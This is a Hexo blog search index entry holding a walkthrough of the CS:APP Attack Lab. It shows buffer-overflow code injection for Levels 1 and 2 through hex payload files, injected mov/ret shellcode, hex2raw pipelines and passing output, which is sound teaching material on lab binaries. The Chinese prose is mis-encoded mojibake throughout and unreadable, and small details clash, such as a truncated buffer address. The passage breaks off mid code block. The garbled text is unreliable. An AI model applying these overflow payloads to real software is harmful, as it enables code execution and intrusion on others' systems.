<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSAPP-Attacklabè¯¦è§£</title>
      <link href="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/"/>
      <url>/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/</url>
      
        <content type="html"><![CDATA[<p><em><a href="http://csapp.cs.cmu.edu/im/labs/attacklab.tar">Attack Lab</a></em>Â <em><strong>[Updated 1/11/16]</strong></em>Â (<a href="http://csapp.cs.cmu.edu/3e/README-attacklab">README</a>,Â <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>,Â <a href="http://csapp.cs.cmu.edu/3e/attacklab-release.html">Release Notes</a>,Â <a href="http://csapp.cs.cmu.edu/3e/target1.tar">Self-Study Handout</a>)</p><blockquote><p>Note: This is the 64-bit successor to the 32-bit Buffer Lab.</p><p><em>targets</em></p><p>If youâ€™re a self-study student, here are a pair ofÂ <a href="http://csapp.cs.cmu.edu/3e/target1.tar">Ubuntu 12.4 targets</a>Â that you can try out for yourself. Youâ€™ll need to run your targets using theÂ <strong>â€œ-qâ€</strong>Â option so that they donâ€™t try to contact a non-existent grading server. If youâ€™re an instructor with a CS:APP acount, you can download the solutionsÂ <a href="http://csapp.cs.cmu.edu/im/labs/target1-sol.tar">here</a>.</p></blockquote><p>å®éªŒä½œä¸šç½‘å€ï¼š<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><h1 id="å‰è¨€">å‰è¨€</h1><h2 id="å®éªŒç›®çš„">å®éªŒç›®çš„</h2><p>åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºé”™è¯¯è¿›è¡Œä»£ç æ³¨å…¥æ”»å‡»å’Œ ROP æ”»å‡»ã€‚å®éªŒæä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ï¼š</p><ul><li><code>ctarget</code>Â å¯æ‰§è¡Œæ–‡ä»¶ç”¨æ¥è¿›è¡Œä»£ç æ³¨å…¥æ”»å‡»ã€‚</li><li><code>rtarget</code>Â ç”¨æ¥è¿›è¡Œ ROP æ”»å‡»ã€‚</li></ul><p>ç”±äº<code>README.txt</code>æ–‡ä»¶ä¸­æœ‰æ•ˆä¿¡æ¯æœ‰æ•ˆï¼Œä¸ºå®Œæˆæœ¬å®éªŒï¼Œ<strong>éå¸¸æœ‰å¿…è¦</strong>é˜…è¯»<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>ï¼Œå…¶ä¸­ä¸ä»…åŒ…æ‹¬å„ä¸ªphaseéœ€è¦å®Œæˆçš„å·¥ä½œï¼Œè¿˜ä»‹ç»äº†hex2rawçš„ä½¿ç”¨æ•™ç¨‹ï¼Œå’Œä½¿ç”¨gccä»¥åŠobjdumpç”Ÿæˆå¾…æ³¨å…¥æ±‡ç¼–ä»£ç çš„æœºå™¨ç ã€‚</p><table><thead><tr><th style="text-align:center">é˜¶æ®µ</th><th style="text-align:center">ç¨‹åº</th><th style="text-align:center">ç­‰çº§</th><th style="text-align:center">æ”»å‡»æ–¹æ³•</th><th style="text-align:center">å‡½æ•°</th><th style="text-align:center">åˆ†å€¼</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">ctarget</td><td style="text-align:center">1</td><td style="text-align:center">CI</td><td style="text-align:center">touch1</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">ctarget</td><td style="text-align:center">2</td><td style="text-align:center">CI</td><td style="text-align:center">touch2</td><td style="text-align:center">25</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">ctarget</td><td style="text-align:center">3</td><td style="text-align:center">CI</td><td style="text-align:center">touch3</td><td style="text-align:center">25</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">rtarget</td><td style="text-align:center">2</td><td style="text-align:center">ROP</td><td style="text-align:center">touch2</td><td style="text-align:center">35</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">rtarget</td><td style="text-align:center">3</td><td style="text-align:center">ROP</td><td style="text-align:center">touch3</td><td style="text-align:center">5</td></tr></tbody></table><ul><li>CI: Code injection</li><li>ROP: Return-oriented programming</li></ul><h2 id="å®éªŒç¯å¢ƒ">å®éªŒç¯å¢ƒ</h2><p>ç»è¿‡æœ¬äººæµ‹è¯•ï¼Œåœ¨WSL2å’ŒVMwareä¸­çš„Ubuntu22.04æ— æ³•è¿›è¡Œæœ¬å®éªŒï¼Œè€ŒDebainå¯ä»¥å®Œæ•´è¿›è¡Œæœ¬å®éªŒã€‚Ubuntu22.04è¿è¡Œ<code>ctarget</code>ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(base) âœ  l3_attacklab ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:FAIL:0xffffffff:ctarget:0:</span><br></pre></td></tr></table></figure><h1 id="ä»£ç æ³¨å…¥æ”»å‡»">ä»£ç æ³¨å…¥æ”»å‡»</h1><p>é¦–å…ˆä½¿ç”¨ <code>checksec</code>ï¼ˆpwndbgæä¾›checksecæ’ä»¶ï¼‰æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶å’Œå†…æ ¸å±æ€§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/jkup/target1/ctarget&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ Linuxä¿æŠ¤æœºåˆ¶ï¼š<a href="https://lantern.cool/note-pwn-linux-protect/index.html">https://lantern.cool/note-pwn-linux-protect/index.html</a></p></blockquote><h2 id="Level-1">Level 1</h2><p>åœ¨Â <code>ctarget</code>Â ä¸­ï¼Œ<code>test</code>Â å‡½æ•°å†…éƒ¨è°ƒç”¨äº†Â <code>getbuf</code>Â å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­Â <code>getbuf</code>Â å‡½æ•°ä¼šåˆ†é…ç¼“å†²åŒºå¤§å°ï¼Œå¹¶è°ƒç”¨Â <code>Gets</code>Â å‡½æ•°è¯»å–ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„Â <code>BUFFER_SIZE</code>Â éœ€è¦ä»æ±‡ç¼–ä»£ç ä¸­è·å–ã€‚level 1 è¦æ±‚æ”»å‡»è€…è¾“å…¥ä¸€æ®µè¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²ï¼Œè¦†ç›–Â <code>test</code>Â æ ˆå¸§ä¸­ä¿å­˜çš„è¿”å›åœ°å€ï¼Œä½¿å¾—ä»Â <code>getbuf</code>Â è¿”å›ä¹‹åä¸æ˜¯ç»§ç»­æ‰§è¡Œè°ƒç”¨Â <code>getbuf</code>Â çš„ä¸‹ä¸€è¡Œï¼Œè€Œæ˜¯ä»Â <code>touch1</code>Â çš„ç¬¬ä¸€è¡Œå¼€å§‹æ‰§è¡Œï¼Œ<code>touch1</code>Â çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†ç¡®å®šå­—ç¬¦ä¸²çš„é•¿åº¦å’Œå†…å®¹ï¼Œéœ€è¦åˆ†æä¸€ä¸‹Â <code>ctarget</code>Â çš„æ±‡ç¼–ä»£ç ï¼Œ<code>objdump -d ctarget &gt; ctarget.asm</code>Â å¯ä»¥å°†Â <code>ctarget</code>Â çš„æ±‡ç¼–ä»£ç å†™å…¥æ–‡ä»¶ã€‚å…¶ä¸­Â <code>touch1</code>Â çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:00 00 00 </span><br><span class="line">  4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:e8 e8 f4 ff ff       call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  4017dd:e8 ab 04 00 00       call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  4017e7:e8 54 f6 ff ff       call   400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯çŸ¥ï¼Œæ”»å‡»è€…éœ€è¦å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºÂ <code>0x4017c0</code>Â æ‰èƒ½å®Œæˆ level 1ã€‚è€ŒÂ <code>getbuf</code>Â çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   ret    </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæ ˆæŒ‡é’ˆå‡å°äº† 0x28 ä¹Ÿå°±æ˜¯ 40ï¼Œè¯´æ˜ç¼“å†²åŒºçš„å¤§å°ä¸º 40 ä¸ªå­—èŠ‚ã€‚ä¸€æ—¦å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆåŒ…æ‹¬ç»“æŸç¬¦ï¼‰å¤§äº 40ï¼Œå°±ä¼šè¦†ç›–è¿”å›åœ°å€ã€‚å­—ç¬¦ä¸²çš„å‰ 40 ä¸ªå­—ç¬¦ä»»æ„ï¼Œç¬¬ 41ã€42 å’Œ 43 ä¸ªå­—ç¬¦çš„åå…­è¿›åˆ¶å€¼å¿…é¡»æ˜¯Â <code>C0</code>ã€<code>17</code>Â å’ŒÂ <code>40</code>ï¼Œæ‰èƒ½å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºÂ <code>0x4017c0</code>ã€‚ä¿®æ”¹å‰åçš„æ ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/2065884-20220514204300738-475480577.png" alt="img"></p><p>ç”±äºÂ <code>C0</code>Â å’ŒÂ <code>17</code>Â å¯¹åº”çš„å­—ç¬¦æ‰“ä¸å‡ºæ¥ï¼Œæ‰€ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶Â <code>exp1.txt</code>ï¼Œåœ¨é‡Œé¢å†™å…¥ 40 ä¸ªÂ <code>30</code>Â åŠ ä¸ŠÂ <code>c0 17 40</code>ï¼Œä¹‹åä½¿ç”¨Â <code>hex2raw</code>Â å°†Â <code>exp1.txt</code>Â ä¸­çš„åå…­è¿›åˆ¶æ•°è½¬ä¸ºå­—ç¬¦ä¸²å¹¶ä½œä¸ºÂ <code>ctarget</code>Â çš„è¾“å…¥ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jkup@R9000P ~/target1&gt; cat exp1.txt | ./hex2raw | ./rtarget -q</span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch1!: You called <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ GDB è°ƒè¯•æŠ€å·§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fooä¸­. ä½¿ç”¨æ™®é€šæ–‡ä»¶æ¯”å‘½åç®¡é“ï¼ˆFIFO)æ›´æ–¹ä¾¿, åè€…è¯»å–åä¸å¯å†æ¬¡è¯»å–</span></span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> exp1.txt | ./hex2raw &gt;foo</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdbè°ƒè¯•æ—¶, runæ—¶æŒ‡å®šå‚æ•°å’Œè¾“å…¥</span></span><br><span class="line">jkup@R9000P ~/target1&gt; gdb ctarget</span><br><span class="line">pwndbg&gt; r -q &lt;foo</span><br></pre></td></tr></table></figure></blockquote><h2 id="Level-2">Level 2</h2><p>level 2 è¦æ±‚è·³è½¬åˆ°Â <code>touch2</code>Â å‡½æ•°ï¼Œä¸”æ‰§è¡Œ if åˆ†æ”¯ï¼Œ<code>touch2</code>Â çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦åœ¨è·³è½¬åˆ°Â <code>touch2</code>Â ä¹‹å‰ä½¿ç”¨æ³¨å…¥çš„æŒ‡ä»¤ï¼Œå°†Â <code>%rdi</code>Â çš„å€¼ä¿®æ”¹ä¸ºÂ <code>cookie</code>Â (æœ¬æ¬¡å®éªŒçš„Â <code>cookie</code>Â ä¸ºÂ <code>0x59b997fa</code>)ã€‚è¦æƒ³è®©è¾“å…¥çš„æŒ‡ä»¤ç”Ÿæ•ˆï¼Œéœ€è¦å°†Â <code>getbuf</code>Â çš„è¿”å›åœ°å€ä¿®æ”¹ä¸ºÂ <code>buf</code>Â çš„èµ·å§‹åœ°å€ï¼Œè¿™æ ·æ‰§è¡ŒÂ <code>ret</code>Â ä¹‹åä¼šå°†Â <code>M[%rsp]</code>Â é€åˆ°Â <code>%rip</code>Â ä¸­ï¼Œä¸‹æ¬¡å°±ä¸ä¼šä» Text åŒºå–æŒ‡ä»¤äº†ï¼Œè€Œæ˜¯ä» stack é‡Œé¢å–æŒ‡ä»¤ï¼ˆæ­¤å¤„å°±æ˜¯ç¼“å†²åŒºï¼‰ã€‚åŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/2065884-20220514224135308-753344556.png" alt="img"></p><p>ä¸Šå›¾ä¸­çš„Â <code>B</code>Â ä»£è¡¨ç¼“å†²åŒºçš„èµ·å§‹åœ°å€ï¼Œä½¿ç”¨ pwndbg å¯ä»¥æ‹¿åˆ°è¿™ä¸ªåœ°å€ä¸ºÂ <code>0x5561dc7</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x5561dc78</span> â—‚â€” <span class="number">0</span></span><br><span class="line">*RIP  <span class="number">0x4017ac</span> (getbuf+<span class="number">4</span>) â—‚â€” mov rdi, rsp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">0x4017a8</span> &lt;getbuf&gt;       sub    rsp, <span class="number">0x28</span></span><br><span class="line"> â–º <span class="number">0x4017ac</span> &lt;getbuf+<span class="number">4</span>&gt;     mov    rdi, rsp</span><br><span class="line">   <span class="number">0x4017af</span> &lt;getbuf+<span class="number">7</span>&gt;     call   Gets                      &lt;Gets&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x4017b4</span> &lt;getbuf+<span class="number">12</span>&gt;    mov    eax, <span class="number">1</span></span><br><span class="line">   <span class="number">0x4017b9</span> &lt;getbuf+<span class="number">17</span>&gt;    add    rsp, <span class="number">0x28</span></span><br><span class="line">   <span class="number">0x4017bd</span> &lt;getbuf+<span class="number">21</span>&gt;    ret</span><br><span class="line"></span><br><span class="line">   <span class="number">0x4017be</span>                nop</span><br><span class="line">   <span class="number">0x4017bf</span>                nop</span><br><span class="line">   <span class="number">0x4017c0</span> &lt;touch1&gt;       sub    rsp, <span class="number">8</span></span><br><span class="line">   <span class="number">0x4017c4</span> &lt;touch1+<span class="number">4</span>&gt;     mov    dword ptr [rip + <span class="number">0x202d0e</span>], <span class="number">1</span> &lt;vlevel&gt;</span><br><span class="line">   <span class="number">0x4017ce</span> &lt;touch1+<span class="number">14</span>&gt;    mov    edi, <span class="number">0x4030c5</span></span><br></pre></td></tr></table></figure><p>ä¸ºäº†å®ç°Â <code>%rdi</code>Â çš„ä¿®æ”¹å’ŒÂ <code>touch2</code>Â çš„è·³è½¬ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„æ±‡ç¼–ä»£ç å®ç°ï¼ˆæ–‡ä»¶å‘½åä¸ºÂ <code>inject_code2.s</code>ï¼‰ï¼Œ<code>ret</code>Â æŒ‡ä»¤å¯ä»¥å°†Â <code>M[%rsp]</code>Â çš„å€¼ï¼ˆæ­¤å¤„ä¸ºÂ <code>touch2</code>Â çš„åœ°å€Â <code>0x4017ec</code>ï¼‰é€åˆ°Â <code>%rip</code>ï¼Œä½¿å¾—ç¨‹åºå›åˆ° Text åŒºçš„Â <code>touch2</code>Â å‡½æ•°å¤„æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %edi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ Linuxä¸‹ä½¿ç”¨AT&amp;Tæ±‡ç¼–æ ¼å¼ï¼Œæ•°å­—å‰åŠ  <code>$</code>ï¼Œå¯„å­˜å™¨æ–‡ä»¶å‰åŠ  <code>%</code> ã€‚<br>æœºå™¨ç  <code>30</code> å¯¹åº” <code>nop</code>ï¼Œ<code>c3</code> å¯¹åº” <code>ret</code>ã€‚</p></blockquote><p>ä½¿ç”¨Â <code>gcc -c inject_code2.s</code>Â å¾—åˆ°ç›®æ ‡æ–‡ä»¶Â <code>inject_code2.o</code>ï¼Œå†ç”¨Â <code>objdump -d inject_code2.o &gt; inject_code2.asm</code>Â è¿›è¡Œåæ±‡ç¼–ï¼Œå¾—åˆ°åŒ…å«äºŒè¿›åˆ¶ç¼–ç çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jkup@R9000P ~/target1&gt; vim inject_code2.s</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> inject_code2.s</span><br><span class="line">mov <span class="variable">$0x59b997fa</span>, %edi</span><br><span class="line">retq</span><br><span class="line">jkup@R9000P ~/target1&gt; gcc -c inject_code2.s</span><br><span class="line">jkup@R9000P ~/target1&gt; objdump -d inject_code2.o &gt; inject_code2.asm</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> inject_code2.asm</span><br><span class="line"></span><br><span class="line">inject_code2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    <span class="variable">$0x59b997fa</span>,%edi</span><br><span class="line">   5:   c3                      retq</span><br></pre></td></tr></table></figure><p>ç¼–å†™<code>exp2.txt</code>ï¼Œæ”»å‡»å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">jkup@R9000P ~/target1&gt; vim exp2.txt</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> exp2.txt</span><br><span class="line">bf fa 97 b9 59 /* mov <span class="variable">$0x59b997fa</span>, %edi */</span><br><span class="line">c3             /* ret */</span><br><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">78 dc 61 55 00 00 00 00 /* buf çš„èµ·å§‹åœ°å€ */</span><br><span class="line">ec 17 40 00 /* touch2 çš„èµ·å§‹åœ°å€ */</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> exp2.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 C3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 EC 17 40 00</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ <strong>æ€è€ƒï¼šè¿™é‡Œæ˜æ˜è®¾ç½®äº†NX enabled å’Œ Canaryï¼Œä½†æ˜¯æ’å…¥çš„ä»£ç ä¾ç„¶å¯æ‰§è¡Œï¼Ÿ</strong></p></blockquote><p>åº”è¯¥æ˜¯ <code>stable_launch</code> ä¸­è¿›è¡Œäº† <code>mmap</code> çš„è®¾ç½®ï¼Œäº§ç”Ÿäº†1ä¸ªå…·æœ‰<code>rwxp</code>å±æ€§çš„æ–°åŒº <code>[anon_55586]</code>ï¼Œç„¶åå°† <code>rsp</code> èµ‹å€¼åˆ°æ­¤åŒºçš„åœ°å€ï¼Œåé¢çš„æ ˆå°±ä¸æ˜¯åœ¨<code>[stack]</code>åŒºä¸Šï¼ˆåœ°å€å¯¹åº”0x7fffâ€¦ï¼‰æ“ä½œï¼Œè€Œæ˜¯åœ¨å…·æœ‰å¯æ‰§è¡Œå±æ€§çš„<code>[anon_55586]</code> ä¸Šæ“ä½œã€‚æ”¯æ’‘ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 